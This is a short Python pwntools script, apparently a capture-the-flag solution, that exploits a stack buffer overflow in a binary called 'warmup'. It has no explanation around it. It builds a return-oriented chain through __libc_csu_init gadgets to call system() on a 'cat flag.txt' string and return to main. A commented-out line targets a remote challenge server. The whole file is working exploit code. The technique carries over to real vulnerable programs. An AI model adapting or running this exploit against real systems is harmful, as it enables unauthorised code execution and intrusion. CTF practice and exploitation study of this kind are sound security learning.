#!  /usr/bin/env python

from pwn import *
context.log_level = 'debug'
elf = ELF('./warmup')

sh = process("./warmup")
#  sh = remote("111.198.29.45",41315)

system_plt = elf.symbols['system']
pop_rbx = 0x40070a
main = 0x0040061d
csu_front = 0x4006f0

print "system_plt: " + hex(system_plt)
print "pop_rbx: " + hex(pop_rbx)

cat_flag_txt = 0x0400734

payload = 'a'*0x48 + p64(pop_rbx) + p64(0) + p64(1)
payload += p64(system_plt) + p64(1) + p64(1) + p64(cat_flag_txt) 
payload += p64(csu_front) + 'a' * 56 + p64(main)


sh.recv()

#payload = 'a' * 0x48 + p64(0x040060d)
sh.sendline(payload)

sh.interactive()
